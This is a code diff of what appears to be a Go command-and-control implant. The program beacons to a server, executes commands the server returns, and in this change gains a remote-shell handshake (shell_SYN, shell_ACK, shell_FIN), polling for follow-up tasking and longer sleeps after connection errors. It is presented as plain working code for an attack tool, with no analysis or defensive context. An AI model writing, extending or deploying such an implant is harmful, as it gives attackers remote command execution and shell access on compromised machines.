@@ -27,6 +27,8 @@ func init_settings() {
         "urls":make([]string, 1),
         "attempts":"3",
         "beacon":"10",
+        "err":"false",
+        "err_sleep":"60",
         "line_cap":"100",
         "debug":"true",
     }
@@ -197,10 +199,13 @@ func stringify(t []interface{} ) []string {
     return s
 }
 
-func do_cmd(body []byte) {
+func do_cmd(body []byte) bool {
     fmt.Println("in do_cmd")
     var j map[string]interface{}
     json.Unmarshal(body, &j)
+    if len(j) == 0 {
+        return false
+    }
     fmt.Printf("Unmarshalled: %s\n", j)
    
     for cmd, record := range j {
@@ -239,6 +244,8 @@ func do_cmd(body []byte) {
             if err != nil {
                 fmt.Printf("Err: %s \n", err)
             }
+        } else if cmd == "shell_SYN" {
+            shell()
         //} else if cmd == "execute" {
         } else { //assume execute
             //rec := get_args(record.([]interface{}))
@@ -254,6 +261,37 @@ func do_cmd(body []byte) {
        
  
     }
+
+    return true
+}
+
+
+func poll_for_work(max_duration time.Duration, max_attempts int, freq time.Duration){
+    attempts := 0
+    start := time.Now()
+
+    for attempts < max_attempts && time.Since(start) < max_duration {
+        b := get_beacon()
+        cmd := send_msg(b)
+        if do_cmd(cmd){
+            return
+        }
+    }
+}
+
+func shell() {
+	cmd := send_msg(url.Values{"shell_ACK": {"True"}})
+    if !do_cmd(cmd) {
+        // Settings are pretty arbitrary for now
+        max_duration := time.Duration(atoi(SETTINGS["beacon"].(string)) * 5)
+        max_attempts := 30
+        freq := time.Second
+        //ensure we have done the next command from the server (probably the shell) before sending shell_FIN
+        poll_for_work(max_duration, max_attempts, freq)
+    }
+    //Give the shell a bit to start, just in case
+    sleep(1)
+    send_msg(url.Values{"shell_FIN": {"True"}})
 }
 
 func atoi(s string) int{
@@ -278,7 +316,7 @@ func send_msg(m url.Values) []byte{
         if err != nil {
             fmt.Println(err)
             err_count++
-            time.Sleep(time.Second)
+            time.Sleep(time.Second * 5)
         } else {
             fmt.Println(resp)
             bodyBytes, _ := ioutil.ReadAll(resp.Body)
@@ -286,8 +324,9 @@ func send_msg(m url.Values) []byte{
             //do_cmd(bodyBytes)
             return bodyBytes
         }
-        break
+        //break
     }
+    SETTINGS["err"] = "true"
     return nil
 }
 
@@ -300,7 +339,12 @@ func main() {
         b := get_beacon()
         cmd := send_msg(b)
         do_cmd(cmd)
-
-        sleep(atoi(SETTINGS["beacon"].(string)))
+        dur := "beacon"
+        if SETTINGS["err"] == "true" {
+            // if an error occured, potentially sleep longer
+            dur = "err_sleep"
+            SETTINGS["err"] = "false"
+        }
+        sleep(atoi(SETTINGS[dur].(string)))
     }
 }
